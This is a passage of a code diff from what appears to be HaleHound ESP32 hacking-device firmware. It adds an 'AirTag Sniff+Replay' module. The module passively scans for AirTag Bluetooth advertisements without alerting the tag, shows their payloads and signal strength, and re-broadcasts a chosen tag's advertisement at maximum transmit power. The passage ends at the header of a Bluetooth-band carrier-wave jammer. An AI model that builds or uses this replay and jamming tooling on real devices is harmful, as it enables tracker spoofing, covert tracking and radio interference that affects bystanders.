+    y += 14;
+
+    // Payload preview (first 8 bytes after header)
+    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+    tft.setCursor(5, y);
+    tft.print("PLD: ");
+    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
+    char pldbuf[28];
+    snprintf(pldbuf, sizeof(pldbuf), "%02X%02X%02X%02X %02X%02X%02X%02X",
+             t.payload[2], t.payload[3], t.payload[4], t.payload[5],
+             t.payload[6], t.payload[7], t.payload[8], t.payload[9]);
+    tft.print(pldbuf);
+    y += 14;
+
+    // Capture RSSI + proximity
+    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+    tft.setCursor(5, y);
+    tft.print("CAP: ");
+    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
+    tft.printf("%ddBm (%s)", t.rssi, arProximityStr(t.rssi));
+    y += 14;
+
+    // Battery
+    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+    tft.setCursor(5, y);
+    tft.print("BAT: ");
+    tft.setTextColor(arBatteryColor(t.battery), TFT_BLACK);
+    tft.print(arBatteryStr(t.battery));
+    y += 18;
+
+    // Status line
+    if (S->replaying) {
+        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
+        tft.setCursor(5, y);
+        tft.print("[!] TRANSMITTING        ");
+    } else {
+        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
+        tft.setCursor(5, y);
+        tft.print("[*] Tap play to replay  ");
+    }
+
+    S->staticDrawn = true;
+    S->lastReplayState = S->replaying;
+}
+
+static void arDrawDynamicReplay() {
+    // Redraw static on first call or state change
+    if (!S->staticDrawn || (S->replaying != S->lastReplayState)) {
+        arDrawStaticReplayInfo();
+    }
+
+    if (!S->replaying) return;
+
+    tft.setTextSize(1);
+
+    // Replay count + rate
+    char buf[36];
+    snprintf(buf, sizeof(buf), "[+] TX: %-8lu (%d/s)  ", S->replayCount, S->replayRate);
+    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+    tft.setCursor(5, 148);
+    tft.print(buf);
+}
+
+static void arDrawSkulls() {
+    int skullStartX = 10;
+    int skullSpacing = (SCREEN_WIDTH - 20) / AR_SKULL_NUM;
+    int frame = (int)(millis() / 120);
+
+    for (int i = 0; i < AR_SKULL_NUM; i++) {
+        int x = skullStartX + (i * skullSpacing);
+        tft.fillRect(x, AR_SKULL_Y, 16, 16, TFT_BLACK);
+
+        uint16_t color;
+        if (S->replaying) {
+            int phase = (frame + i) % 8;
+            if (phase < 4) {
+                color = arGradientColor(phase / 3.0f);
+            } else {
+                float ratio = (phase - 4) / 3.0f;
+                uint8_t r = 255 - (uint8_t)(ratio * 255);
+                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
+                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
+                color = tft.color565(r, g, b);
+            }
+        } else {
+            color = HALEHOUND_GUNMETAL;
+        }
+
+        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&arSkulls[i]);
+        tft.drawBitmap(x, AR_SKULL_Y, icon, 16, 16, color);
+    }
+
+    // TX/OFF label
+    int labelX = skullStartX + (AR_SKULL_NUM * skullSpacing) + 5;
+    tft.fillRect(labelX - 5, AR_SKULL_Y, 50, 16, TFT_BLACK);
+    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
+    tft.setTextSize(1);
+    tft.setCursor(labelX, AR_SKULL_Y + 4);
+    tft.print(S->replaying ? "TX!" : "OFF");
+}
+
+static void arDrawCounterBar() {
+    tft.fillRect(0, AR_BAR_Y, SCREEN_WIDTH, 25, TFT_BLACK);
+
+    int barX = 10;
+    int barY = AR_BAR_Y + 2;
+    int barW = SCALE_W(140);
+    int barH = 10;
+
+    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
+    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);
+
+    // Fill proportional to rate (max ~1 replay every 2s = 0.5/s, but show at higher scale)
+    float fillPct = (S->replayRate > 0) ? (float)S->replayRate / 2.0f : 0.0f;
+    if (fillPct > 1.0f) fillPct = 1.0f;
+    int fillW = (int)(fillPct * barW);
+    if (fillW > 0) {
+        for (int px = 0; px < fillW; px++) {
+            float ratio = (float)px / (float)barW;
+            uint16_t c = arGradientColor(ratio);
+            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
+        }
+    }
+
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
+    char cntBuf[12];
+    snprintf(cntBuf, sizeof(cntBuf), "%lu", S->replayCount);
+    tft.setCursor(barX + 4, barY + 1);
+    tft.print(cntBuf);
+
+    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
+    tft.setCursor(SCALE_X(160), AR_BAR_Y + 3);
+    tft.printf("%d rep/s", S->replayRate);
+
+    if (S->replaying) {
+        tft.drawBitmap(SCALE_X(220), AR_BAR_Y + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// START / STOP / TOGGLE REPLAY
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void startReplay() {
+    // Must have a selected tag
+    bool hasSelection = false;
+    for (int i = 0; i < S->tagCount; i++) {
+        if (S->captured[i].selected) { hasSelection = true; break; }
+    }
+    if (!hasSelection) return;
+
+    // Deinit scan before replay — can't scan and advertise simultaneously
+    if (S->pArScan) {
+        S->pArScan->stop();
+        S->pArScan = nullptr;
+    }
+    BLEDevice::deinit(false);
+    delay(100);
+
+    // Re-init for advertising
+    releaseClassicBtMemory();
+    BLEDevice::init("HaleHound");
+    delay(150);
+
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+
+    S->replaying = true;
+    S->replayCount = 0;
+    S->replayRate = 0;
+    S->rateWindowCount = 0;
+    S->staticDrawn = false;
+
+    // Switch to replay view
+    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, TFT_BLACK);
+    arDrawIconBar();
+    arDrawStatus(">> REPLAYING <<", HALEHOUND_HOTPINK);
+    arDrawStaticReplayInfo();
+    arDrawSkulls();
+    arDrawCounterBar();
+
+    startReplayTask();
+
+    #if CYD_DEBUG
+    Serial.println("[REPLAY] Started (Core 0)");
+    #endif
+}
+
+static void stopReplay() {
+    stopReplayTask();
+
+    // Re-init for scanning
+    BLEDevice::deinit(false);
+    delay(100);
+
+    releaseClassicBtMemory();
+    BLEDevice::init("");
+    delay(150);
+
+    S->pArScan = BLEDevice::getScan();
+    if (S->pArScan) {
+        S->pArScan->setActiveScan(false);
+        S->pArScan->setInterval(100);
+        S->pArScan->setWindow(99);
+    }
+
+    S->staticDrawn = false;
+
+    // Switch back to list view
+    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, TFT_BLACK);
+    arDrawIconBar();
+    arDrawStatus("SCAN MODE", HALEHOUND_MAGENTA);
+    arDrawTagList();
+
+    #if CYD_DEBUG
+    Serial.println("[REPLAY] Stopped, back to scan mode");
+    #endif
+}
+
+static void toggleReplay() {
+    if (S->replaying) {
+        stopReplay();
+    } else {
+        startReplay();
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PUBLIC FUNCTIONS
+// ═══════════════════════════════════════════════════════════════════════════
+
+void setup() {
+    if (S && S->initialized) return;
+
+    #if CYD_DEBUG
+    Serial.println("[REPLAY] Initializing AirTag Sniff+Replay...");
+    #endif
+
+    // Heap-allocate all state (zero-init)
+    if (!S) {
+        S = (ArState*)calloc(1, sizeof(ArState));
+        if (!S) {
+            Serial.println("[REPLAY] ERROR: calloc failed");
+            return;
+        }
+    } else {
+        memset(S, 0, sizeof(ArState));
+    }
+
+    tft.fillScreen(HALEHOUND_BLACK);
+    drawStatusBar();
+    arDrawIconBar();
+    arDrawHeader();
+
+    // Tear down WiFi before BLE init
+    WiFi.mode(WIFI_OFF);
+    delay(50);
+
+    // Init BLE for scanning
+    releaseClassicBtMemory();
+    BLEDevice::init("");
+    delay(150);
+
+    S->pArScan = BLEDevice::getScan();
+    if (!S->pArScan) {
+        Serial.println("[REPLAY] ERROR: getScan() returned NULL");
+        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
+        tft.setCursor(10, 100);
+        tft.print("BLE INIT FAILED");
+        S->exitRequested = true;
+        return;
+    }
+    S->pArScan->setActiveScan(false);  // Passive — don't alert the tracker
+    S->pArScan->setInterval(100);
+    S->pArScan->setWindow(99);
+
+    S->initialized = true;
+
+    // First scan
+    arDrawStatus("SCANNING...", HALEHOUND_MAGENTA);
+    runScan();
+    if (S->tagCount > 0) {
+        char sbuf[24];
+        snprintf(sbuf, sizeof(sbuf), "%d TAGS FOUND", S->tagCount);
+        arDrawStatus(sbuf, HALEHOUND_GREEN);
+    } else {
+        arDrawStatus("NO TAGS - RESCAN", HALEHOUND_GUNMETAL);
+    }
+    arDrawTagList();
+
+    S->lastDisplayUpdate = millis();
+
+    // Consume lingering touch from menu selection
+    waitForTouchRelease();
+
+    #if CYD_DEBUG
+    Serial.printf("[REPLAY] Ready, found %d tags\n", S->tagCount);
+    #endif
+}
+
+void loop() {
+    if (!S || !S->initialized) return;
+
+    touchButtonsUpdate();
+
+    // ── Icon bar touch ──────────────────────────────────────────────────
+    if (millis() - S->lastIconTap > 250) {
+        uint16_t tx, ty;
+        if (getTouchPoint(&tx, &ty)) {
+            if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
+                waitForTouchRelease();
+
+                // Back button (x: 10-30)
+                if (tx >= 5 && tx <= 30) {
+                    if (S->replaying) stopReplay();
+                    S->exitRequested = true;
+                    S->lastIconTap = millis();
+                    return;
+                }
+                // Scan button (x: 60-80)
+                else if (tx >= 50 && tx <= 80) {
+                    if (!S->replaying && S->pArScan) {
+                        arDrawStatus("SCANNING...", HALEHOUND_MAGENTA);
+                        runScan();
+                        char sbuf[24];
+                        snprintf(sbuf, sizeof(sbuf), "%d TAGS FOUND", S->tagCount);
+                        arDrawStatus(sbuf, HALEHOUND_GREEN);
+                        arDrawTagList();
+                    }
+                    S->lastIconTap = millis();
+                    return;
+                }
+                // Play/Stop button (x: 110-130)
+                else if (tx >= 100 && tx <= 135) {
+                    if (S->tagCount > 0) {
+                        // If no tag selected yet, auto-select current
+                        if (!S->replaying) {
+                            bool anySelected = false;
+                            for (int i = 0; i < S->tagCount; i++) {
+                                if (S->captured[i].selected) { anySelected = true; break; }
+                            }
+                            if (!anySelected) {
+                                S->captured[S->currentIndex].selected = true;
+                            }
+                        }
+                        toggleReplay();
+                    }
+                    S->lastIconTap = millis();
+                    return;
+                }
+            }
+        }
+    }
+
+    // ── Hardware buttons ────────────────────────────────────────────────
+    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
+        if (S->replaying) stopReplay();
+        S->exitRequested = true;
+        return;
+    }
+
+    if (!S->replaying) {
+        // ── SCAN PHASE INPUT ────────────────────────────────────────────
+        if (buttonPressed(BTN_UP)) {
+            if (S->currentIndex > 0) {
+                S->currentIndex--;
+                if (S->currentIndex < S->listStartIndex) S->listStartIndex--;
+                arDrawTagList();
+            }
+        }
+
+        if (buttonPressed(BTN_DOWN)) {
+            if (S->currentIndex < S->tagCount - 1) {
+                S->currentIndex++;
+                if (S->currentIndex >= S->listStartIndex + AR_MAX_VISIBLE) S->listStartIndex++;
+                arDrawTagList();
+            }
+        }
+
+        if (buttonPressed(BTN_SELECT)) {
+            if (S->tagCount > 0) {
+                // Deselect all, select current (single selection)
+                for (int i = 0; i < S->tagCount; i++) S->captured[i].selected = false;
+                S->captured[S->currentIndex].selected = true;
+                arDrawTagList();
+            }
+        }
+
+        if (buttonPressed(BTN_RIGHT)) {
+            // Start replay if a tag is selected
+            if (S->tagCount > 0) {
+                bool anySelected = false;
+                for (int i = 0; i < S->tagCount; i++) {
+                    if (S->captured[i].selected) { anySelected = true; break; }
+                }
+                if (!anySelected) {
+                    S->captured[S->currentIndex].selected = true;
+                }
+                startReplay();
+            }
+        }
+
+        // Touch to select device in list
+        int touched = getTouchedMenuItem(92, AR_LINE_HEIGHT, min((int)AR_MAX_VISIBLE, (int)(S->tagCount - S->listStartIndex)));
+        if (touched >= 0) {
+            int idx = S->listStartIndex + touched;
+            // Deselect all, select touched
+            for (int i = 0; i < S->tagCount; i++) S->captured[i].selected = false;
+            S->captured[idx].selected = true;
+            S->currentIndex = idx;
+            arDrawTagList();
+        }
+    } else {
+        // ── REPLAY PHASE INPUT ──────────────────────────────────────────
+        if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_LEFT)) {
+            stopReplay();
+        }
+
+        // Dynamic display update at ~10fps
+        if (millis() - S->lastDisplayUpdate >= 100) {
+            arDrawDynamicReplay();
+            arDrawSkulls();
+            arDrawCounterBar();
+            S->lastDisplayUpdate = millis();
+        }
+    }
+
+    yield();
+}
+
+bool isExitRequested() {
+    return S ? S->exitRequested : false;
+}
+
+void cleanup() {
+    if (S) {
+        stopReplayTask();
+
+        if (S->pArScan) {
+            S->pArScan->stop();
+            S->pArScan = nullptr;
+        }
+
+        BLEDevice::deinit(false);
+
+        free(S);
+        S = nullptr;
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[REPLAY] Cleanup complete");
+    #endif
+}
+
+}  // namespace AirTagReplay
+
+
+// ═══════════════════════════════════════════════════════════════════════════
 // BLE JAMMER IMPLEMENTATION - NRF24L01+PA+LNA Continuous Carrier Wave
 // Targets Bluetooth 2.402-2.480 GHz band (79 channels)
 // Uses same proven NRF24 technique as WLAN Jammer
